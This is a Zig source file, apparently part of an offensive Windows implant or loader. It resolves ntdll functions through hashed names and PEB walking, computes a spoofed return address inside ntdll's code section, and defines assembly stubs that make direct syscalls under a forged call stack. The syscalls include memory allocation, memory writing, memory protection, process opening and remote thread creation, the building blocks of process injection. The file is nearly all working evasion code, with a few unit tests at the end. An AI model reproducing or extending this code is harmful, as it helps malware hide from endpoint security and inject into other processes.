const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const RUNTIME_FUNCTION = extern struct {
    BeginAddress: u32,
    EndAddress: u32,
    UnwindInfoAddress: u32,
};

const UNWIND_HISTORY_TABLE = extern struct {
    Count: u32,
    LocalHint: u8,
    GlobalHint: u8,
    Scan: u8,
    FunctionEntry: u8,
    EntryLowAddress: [12]u64,
    EntryHighAddress: [12]u64,
    Entry: [12]*RUNTIME_FUNCTION,
};

const RtlLookupFunctionEntryFn = *const fn (
    control_pc: u64,
    image_base: *u64,
    history_table: *UNWIND_HISTORY_TABLE,
) callconv(.winapi) *RUNTIME_FUNCTION;

const RtlVirtualUnwindFn = *const fn (
    handler_type: u32,
    image_base: u64,
    control_pc: u64,
    function_entry: *RUNTIME_FUNCTION,
    context_record: *types.CONTEXT,
    handler_data: *?*anyopaque,
    establisher_frame: *u64,
    context_pointers: ?*anyopaque,
) callconv(.winapi) void;

const ntdll_dll_hash: u32 = hash.encryptedHashModule("ntdll.dll");
const lookup_hash: u32 = hash.encryptedHashFunc("RtlLookupFunctionEntry");
const unwind_hash: u32 = hash.encryptedHashFunc("RtlVirtualUnwind");

var g_lookup_func_entry: ?RtlLookupFunctionEntryFn = null;
var g_virtual_unwind: ?RtlVirtualUnwindFn = null;

pub export var g_spoofed_ret_addr: u64 = 0;

const TextBounds = struct { start: u64, end: u64 };

fn getTextSectionBounds(base: types.PVOID) ?TextBounds {
    const bp: [*]u8 = @ptrCast(@alignCast(base));
    const dos: *types.IMAGE_DOS_HEADER = @ptrCast(@alignCast(bp));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;
    const nt_off: usize = @intCast(dos.e_lfanew);
    const nt: *types.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(bp + nt_off));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;
    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(bp + sec_off));
    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return TextBounds{
                .start = @intFromPtr(bp) + s.VirtualAddress,
                .end = @intFromPtr(bp) + s.VirtualAddress + s.Misc.VirtualSize,
            };
        }
    }
    return null;
}

fn pickSampleAddress(bounds: TextBounds) u64 {
    const len = bounds.end - bounds.start;
    if (len < 0x200) return bounds.start + 0x100;
    const addr_for_entropy = @intFromPtr(&pickSampleAddress);
    const offset: u64 = 0x100 + (addr_for_entropy % (len - 0x200));
    return bounds.start + offset;
}

pub fn init() bool {
    const ntdll = peb_walk.getModuleByHash(ntdll_dll_hash) orelse return false;

    const lookup_raw = export_resolve.getFunctionByHash(ntdll, lookup_hash) orelse return false;
    const unwind_raw = export_resolve.getFunctionByHash(ntdll, unwind_hash) orelse return false;

    g_lookup_func_entry = @ptrCast(@alignCast(lookup_raw));
    g_virtual_unwind = @ptrCast(@alignCast(unwind_raw));

    const bounds = getTextSectionBounds(ntdll) orelse return false;
    const sample = pickSampleAddress(bounds);

    var image_base: u64 = 0;
    var history: UNWIND_HISTORY_TABLE = std.mem.zeroes(UNWIND_HISTORY_TABLE);

    const func_entry = g_lookup_func_entry.?(sample, &image_base, &history);
    if (@intFromPtr(func_entry) == 0) {
        g_spoofed_ret_addr = sample;
        return true;
    }

    var ctx: types.CONTEXT = std.mem.zeroes(types.CONTEXT);
    ctx.ContextFlags = 0x100003;
    ctx.Rip = sample;
    ctx.Rsp = bounds.start + 0x800;

    var handler_data: ?*anyopaque = null;
    var establisher_frame: u64 = 0;

    g_virtual_unwind.?(0, image_base, sample, func_entry, &ctx, &handler_data, &establisher_frame, null);

    if (ctx.Rip > bounds.start and ctx.Rip < bounds.end) {
        g_spoofed_ret_addr = ctx.Rip;
    } else {
        g_spoofed_ret_addr = sample;
    }
    return true;
}

pub inline fn getSpoofedReturnAddress() u64 {
    return g_spoofed_ret_addr;
}

pub fn refreshSpoofedAddress() void {
    const ntdll = peb_walk.getModuleByHash(ntdll_dll_hash) orelse return;
    const bounds = getTextSectionBounds(ntdll) orelse return;
    const sample = pickSampleAddress(bounds);
    var image_base: u64 = 0;
    var history: UNWIND_HISTORY_TABLE = std.mem.zeroes(UNWIND_HISTORY_TABLE);
    const func_entry = if (g_lookup_func_entry) |f| f(sample, &image_base, &history) else return;
    if (@intFromPtr(func_entry) == 0) {
        g_spoofed_ret_addr = sample;
        return;
    }
    var ctx: types.CONTEXT = std.mem.zeroes(types.CONTEXT);
    ctx.ContextFlags = 0x100003;
    ctx.Rip = sample;
    ctx.Rsp = bounds.start + 0x800;
    var handler_data: ?*anyopaque = null;
    var establisher_frame: u64 = 0;
    if (g_virtual_unwind) |f| f(0, image_base, sample, func_entry, &ctx, &handler_data, &establisher_frame, null);
    if (ctx.Rip > bounds.start and ctx.Rip < bounds.end) {
        g_spoofed_ret_addr = ctx.Rip;
    } else {
        g_spoofed_ret_addr = sample;
    }
}

comptime {
    asm (
        \\.global NtClose_spoofed
        \\NtClose_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtClose(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtDeleteFile_spoofed
        \\NtDeleteFile_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtDeleteFile(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtUserGetSystemMetrics_spoofed
        \\NtUserGetSystemMetrics_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtUserGetSystemMetrics(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtDelayExecution_spoofed
        \\NtDelayExecution_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtDelayExecution(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtUnmapViewOfSection_spoofed
        \\NtUnmapViewOfSection_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtUnmapViewOfSection(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtResumeThread_spoofed
        \\NtResumeThread_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtResumeThread(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtSuspendThread_spoofed
        \\NtSuspendThread_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtSuspendThread(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtGetContextThread_spoofed
        \\NtGetContextThread_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtGetContextThread(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtSetContextThread_spoofed
        \\NtSetContextThread_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtSetContextThread(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtOpenKey_spoofed
        \\NtOpenKey_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtOpenKey(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtOpenSection_spoofed
        \\NtOpenSection_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtOpenSection(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtWaitForSingleObject_spoofed
        \\NtWaitForSingleObject_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtWaitForSingleObject(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtFreeVirtualMemory_spoofed
        \\NtFreeVirtualMemory_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtFreeVirtualMemory(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtOpenProcess_spoofed
        \\NtOpenProcess_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtOpenProcess(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtSetInformationProcess_spoofed
        \\NtSetInformationProcess_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtSetInformationProcess(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtQuerySystemInformation_spoofed
        \\NtQuerySystemInformation_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movl ssn_NtQuerySystemInformation(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtProtectVirtualMemory_spoofed
        \\NtProtectVirtualMemory_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq %r11, 0x28(%rsp)
        \\    movl ssn_NtProtectVirtualMemory(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtWriteVirtualMemory_spoofed
        \\NtWriteVirtualMemory_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq %r11, 0x28(%rsp)
        \\    movl ssn_NtWriteVirtualMemory(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtReadVirtualMemory_spoofed
        \\NtReadVirtualMemory_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq %r11, 0x28(%rsp)
        \\    movl ssn_NtReadVirtualMemory(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtQueryInformationProcess_spoofed
        \\NtQueryInformationProcess_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq %r11, 0x28(%rsp)
        \\    movl ssn_NtQueryInformationProcess(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtAllocateVirtualMemory_spoofed
        \\NtAllocateVirtualMemory_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movl ssn_NtAllocateVirtualMemory(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtCreateSection_spoofed
        \\NtCreateSection_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq 0x40(%rsp), %rdi
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movq %rdi, 0x38(%rsp)
        \\    movl ssn_NtCreateSection(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtWriteFile_spoofed
        \\NtWriteFile_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq 0x40(%rsp), %rdi
        \\    movq 0x48(%rsp), %rsi
        \\    movq 0x50(%rsp), %r12
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movq %rdi, 0x38(%rsp)
        \\    movq %rsi, 0x40(%rsp)
        \\    movq %r12, 0x48(%rsp)
        \\    movl ssn_NtWriteFile(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtMapViewOfSection_spoofed
        \\NtMapViewOfSection_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq 0x40(%rsp), %rdi
        \\    movq 0x48(%rsp), %rsi
        \\    movq 0x50(%rsp), %r12
        \\    movq 0x58(%rsp), %r13
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movq %rdi, 0x38(%rsp)
        \\    movq %rsi, 0x40(%rsp)
        \\    movq %r12, 0x48(%rsp)
        \\    movq %r13, 0x50(%rsp)
        \\    movl ssn_NtMapViewOfSection(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtCreateFile_spoofed
        \\NtCreateFile_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq 0x40(%rsp), %rdi
        \\    movq 0x48(%rsp), %rsi
        \\    movq 0x50(%rsp), %r12
        \\    movq 0x58(%rsp), %r13
        \\    movq 0x60(%rsp), %r14
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movq %rdi, 0x38(%rsp)
        \\    movq %rsi, 0x40(%rsp)
        \\    movq %r12, 0x48(%rsp)
        \\    movq %r13, 0x50(%rsp)
        \\    movq %r14, 0x58(%rsp)
        \\    movl ssn_NtCreateFile(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret

        \\.global NtCreateThreadEx_spoofed
        \\NtCreateThreadEx_spoofed:
        \\    pushq g_spoofed_ret_addr(%rip)
        \\    movq 0x30(%rsp), %r11
        \\    movq 0x38(%rsp), %rbx
        \\    movq 0x40(%rsp), %rdi
        \\    movq 0x48(%rsp), %rsi
        \\    movq 0x50(%rsp), %r12
        \\    movq 0x58(%rsp), %r13
        \\    movq 0x60(%rsp), %r14
        \\    movq %r11, 0x28(%rsp)
        \\    movq %rbx, 0x30(%rsp)
        \\    movq %rdi, 0x38(%rsp)
        \\    movq %rsi, 0x40(%rsp)
        \\    movq %r12, 0x48(%rsp)
        \\    movq %r13, 0x50(%rsp)
        \\    movq %r14, 0x58(%rsp)
        \\    movl ssn_NtCreateThreadEx(%rip), %eax
        \\    movq %rcx, %r10
        \\    syscall
        \\    addq $8, %rsp
        \\    ret
    );
}

extern fn NtClose_spoofed(a1: u64) callconv(.c) u64;

pub fn NtClose(Handle: types.HANDLE) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtClose_spoofed(@intFromPtr(Handle))));
}

extern fn NtDeleteFile_spoofed(a1: u64) callconv(.c) u64;

pub fn NtDeleteFile(ObjectAttributes: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtDeleteFile_spoofed(@intFromPtr(ObjectAttributes))));
}

extern fn NtDelayExecution_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtDelayExecution(Alertable: types.BOOLEAN, DelayInterval: *types.LARGE_INTEGER) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtDelayExecution_spoofed(Alertable, @intFromPtr(DelayInterval))));
}

extern fn NtUnmapViewOfSection_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtUnmapViewOfSection(ProcessHandle: types.HANDLE, BaseAddress: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtUnmapViewOfSection_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress))));
}

extern fn NtResumeThread_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtResumeThread(ThreadHandle: types.HANDLE, SuspendCount: *types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtResumeThread_spoofed(@intFromPtr(ThreadHandle), @intFromPtr(SuspendCount))));
}

extern fn NtSuspendThread_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtSuspendThread(ThreadHandle: types.HANDLE, PreviousSuspendCount: *types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSuspendThread_spoofed(@intFromPtr(ThreadHandle), @intFromPtr(PreviousSuspendCount))));
}

extern fn NtGetContextThread_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtGetContextThread(ThreadHandle: types.HANDLE, Context: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtGetContextThread_spoofed(@intFromPtr(ThreadHandle), @intFromPtr(Context))));
}

extern fn NtSetContextThread_spoofed(a1: u64, a2: u64) callconv(.c) u64;

pub fn NtSetContextThread(ThreadHandle: types.HANDLE, Context: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSetContextThread_spoofed(@intFromPtr(ThreadHandle), @intFromPtr(Context))));
}

extern fn NtOpenKey_spoofed(a1: u64, a2: u64, a3: u64) callconv(.c) u64;

pub fn NtOpenKey(KeyHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenKey_spoofed(@intFromPtr(KeyHandle), DesiredAccess, @intFromPtr(ObjectAttributes))));
}

extern fn NtOpenSection_spoofed(a1: u64, a2: u64, a3: u64) callconv(.c) u64;

pub fn NtOpenSection(SectionHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenSection_spoofed(@intFromPtr(SectionHandle), DesiredAccess, @intFromPtr(ObjectAttributes))));
}

extern fn NtWaitForSingleObject_spoofed(a1: u64, a2: u64, a3: u64) callconv(.c) u64;

pub fn NtWaitForSingleObject(Handle: types.HANDLE, Alertable: types.BOOLEAN, Timeout: ?*const types.LARGE_INTEGER) types.NTSTATUS {
    const to = if (Timeout) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtWaitForSingleObject_spoofed(@intFromPtr(Handle), Alertable, to)));
}

extern fn NtFreeVirtualMemory_spoofed(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;

pub fn NtFreeVirtualMemory(ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID, RegionSize: *types.SIZE_T, FreeType: types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtFreeVirtualMemory_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), @intFromPtr(RegionSize), FreeType)));
}

extern fn NtOpenProcess_spoofed(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;

pub fn NtOpenProcess(ProcessHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID, ClientId: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenProcess_spoofed(@intFromPtr(ProcessHandle), DesiredAccess, @intFromPtr(ObjectAttributes), @intFromPtr(ClientId))));
}

extern fn NtSetInformationProcess_spoofed(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;

pub fn NtSetInformationProcess(ProcessHandle: types.HANDLE, ProcessInformationClass: types.ULONG, ProcessInformation: types.PVOID, ProcessInformationLength: types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSetInformationProcess_spoofed(@intFromPtr(ProcessHandle), ProcessInformationClass, @intFromPtr(ProcessInformation), ProcessInformationLength)));
}

extern fn NtQuerySystemInformation_spoofed(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;

pub fn NtQuerySystemInformation(SystemInformationClass: types.ULONG, SystemInformation: types.PVOID, SystemInformationLength: types.ULONG, ReturnLength: *types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtQuerySystemInformation_spoofed(SystemInformationClass, @intFromPtr(SystemInformation), SystemInformationLength, @intFromPtr(ReturnLength))));
}

extern fn NtUserGetSystemMetrics_spoofed(a1: u64) callconv(.c) u64;

pub fn NtUserGetSystemMetrics(nIndex: types.ULONG) types.LONG {
    const r = NtUserGetSystemMetrics_spoofed(nIndex);
    return @as(types.LONG, @bitCast(@as(u32, @truncate(r))));
}

extern fn NtAllocateVirtualMemory_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;

pub fn NtAllocateVirtualMemory(ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID, ZeroBits: types.ULONG, RegionSize: *types.SIZE_T, AllocationType: types.ULONG, Protect: types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtAllocateVirtualMemory_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), ZeroBits, @intFromPtr(RegionSize), AllocationType, Protect)));
}

extern fn NtProtectVirtualMemory_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;

pub fn NtProtectVirtualMemory(ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID, NumberOfBytesToProtect: *types.SIZE_T, NewAccessProtection: types.ULONG, OldAccessProtection: *types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtProtectVirtualMemory_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), @intFromPtr(NumberOfBytesToProtect), NewAccessProtection, @intFromPtr(OldAccessProtection))));
}

extern fn NtWriteVirtualMemory_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;

pub fn NtWriteVirtualMemory(ProcessHandle: types.HANDLE, BaseAddress: types.PVOID, Buffer: types.PVOID, NumberOfBytesToWrite: types.SIZE_T, NumberOfBytesWritten: *types.SIZE_T) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtWriteVirtualMemory_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), @intFromPtr(Buffer), NumberOfBytesToWrite, @intFromPtr(NumberOfBytesWritten))));
}

extern fn NtReadVirtualMemory_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;

pub fn NtReadVirtualMemory(ProcessHandle: types.HANDLE, BaseAddress: types.PVOID, Buffer: types.PVOID, NumberOfBytesToRead: types.SIZE_T, NumberOfBytesWritten: *types.SIZE_T) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtReadVirtualMemory_spoofed(@intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), @intFromPtr(Buffer), NumberOfBytesToRead, @intFromPtr(NumberOfBytesWritten))));
}

extern fn NtQueryInformationProcess_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;

pub fn NtQueryInformationProcess(ProcessHandle: types.HANDLE, ProcessInformationClass: types.ULONG, ProcessInformation: types.PVOID, ProcessInformationLength: types.ULONG, ReturnLength: *types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtQueryInformationProcess_spoofed(@intFromPtr(ProcessHandle), ProcessInformationClass, @intFromPtr(ProcessInformation), ProcessInformationLength, @intFromPtr(ReturnLength))));
}

extern fn NtCreateSection_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64) callconv(.c) u64;

pub fn NtCreateSection(SectionHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID, MaximumSize: types.PVOID, SectionPageProtection: types.ULONG, AllocationAttributes: types.ULONG, FileHandle: types.HANDLE) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtCreateSection_spoofed(@intFromPtr(SectionHandle), DesiredAccess, @intFromPtr(ObjectAttributes), @intFromPtr(MaximumSize), SectionPageProtection, AllocationAttributes, @intFromPtr(FileHandle))));
}

extern fn NtCreateFile_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64, a11: u64) callconv(.c) u64;

pub fn NtCreateFile(FileHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID, IoStatusBlock: types.PVOID, AllocationSize: ?*const anyopaque, FileAttributes: types.ULONG, ShareAccess: types.ULONG, CreateDisposition: types.ULONG, CreateOptions: types.ULONG, EaBuffer: ?*const anyopaque, EaLength: types.ULONG) types.NTSTATUS {
    const alloc_size = if (AllocationSize) |p| @intFromPtr(p) else 0;
    const ea_buf = if (EaBuffer) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtCreateFile_spoofed(@intFromPtr(FileHandle), DesiredAccess, @intFromPtr(ObjectAttributes), @intFromPtr(IoStatusBlock), alloc_size, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, ea_buf, EaLength)));
}

extern fn NtWriteFile_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64) callconv(.c) u64;

pub fn NtWriteFile(FileHandle: types.HANDLE, Event: types.HANDLE, ApcRoutine: ?*const anyopaque, ApcContext: ?*const anyopaque, IoStatusBlock: types.PVOID, Buffer: types.PVOID, Length: types.ULONG, ByteOffset: ?*const anyopaque, Key: ?*const anyopaque) types.NTSTATUS {
    const apc_routine = if (ApcRoutine) |p| @intFromPtr(p) else 0;
    const apc_context = if (ApcContext) |p| @intFromPtr(p) else 0;
    const byte_off = if (ByteOffset) |p| @intFromPtr(p) else 0;
    const key = if (Key) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtWriteFile_spoofed(@intFromPtr(FileHandle), @intFromPtr(Event), apc_routine, apc_context, @intFromPtr(IoStatusBlock), @intFromPtr(Buffer), Length, byte_off, key)));
}

extern fn NtMapViewOfSection_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64) callconv(.c) u64;

pub fn NtMapViewOfSection(SectionHandle: types.HANDLE, ProcessHandle: types.HANDLE, BaseAddress: *types.PVOID, ZeroBits: types.ULONG, CommitSize: types.SIZE_T, SectionOffset: types.PVOID, ViewSize: *types.SIZE_T, InheritDisposition: types.ULONG, _: types.ULONG, _: types.ULONG) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtMapViewOfSection_spoofed(@intFromPtr(SectionHandle), @intFromPtr(ProcessHandle), @intFromPtr(BaseAddress), ZeroBits, CommitSize, @intFromPtr(SectionOffset), @intFromPtr(ViewSize), InheritDisposition, 0, 0)));
}

extern fn NtCreateThreadEx_spoofed(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64, a11: u64) callconv(.c) u64;

pub fn NtCreateThreadEx(ThreadHandle: *types.HANDLE, DesiredAccess: types.ULONG, ObjectAttributes: types.PVOID, ProcessHandle: types.HANDLE, StartRoutine: types.PVOID, Argument: types.PVOID, CreateFlags: types.ULONG, ZeroBits: types.SIZE_T, StackSize: types.SIZE_T, MaximumStackSize: types.SIZE_T, AttributeList: types.PVOID) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtCreateThreadEx_spoofed(@intFromPtr(ThreadHandle), DesiredAccess, @intFromPtr(ObjectAttributes), @intFromPtr(ProcessHandle), @intFromPtr(StartRoutine), @intFromPtr(Argument), CreateFlags, ZeroBits, StackSize, MaximumStackSize, @intFromPtr(AttributeList)));
}

test "stack_spoof resolves APIs and computes spoofed address" {
    try std.testing.expect(init());
    try std.testing.expect(g_lookup_func_entry != null);
    try std.testing.expect(g_virtual_unwind != null);
    const addr = getSpoofedReturnAddress();
    try std.testing.expect(addr != 0);
    const ntdll = peb_walk.getModuleByHash(ntdll_dll_hash) orelse return error.SkipZigTest;
    const bounds = getTextSectionBounds(ntdll) orelse return error.SkipZigTest;
    try std.testing.expect(addr >= bounds.start and addr < bounds.end);
}

test "stack_spoof refresh creates new valid address" {
    try std.testing.expect(init());
    const old = getSpoofedReturnAddress();
    refreshSpoofedAddress();
    const new_addr = getSpoofedReturnAddress();
    try std.testing.expect(new_addr != 0);
    try std.testing.expect(new_addr >= old or new_addr == g_spoofed_ret_addr);
}

test "stack_spoof NtClose returns success" {
    try std.testing.expect(init());
    const status = NtClose(@ptrFromInt(@as(u64, @intCast(~0))));
    try std.testing.expect(status == 0 or status == @as(types.NTSTATUS, @bitCast(@as(u32, 0xC0000008))));
}
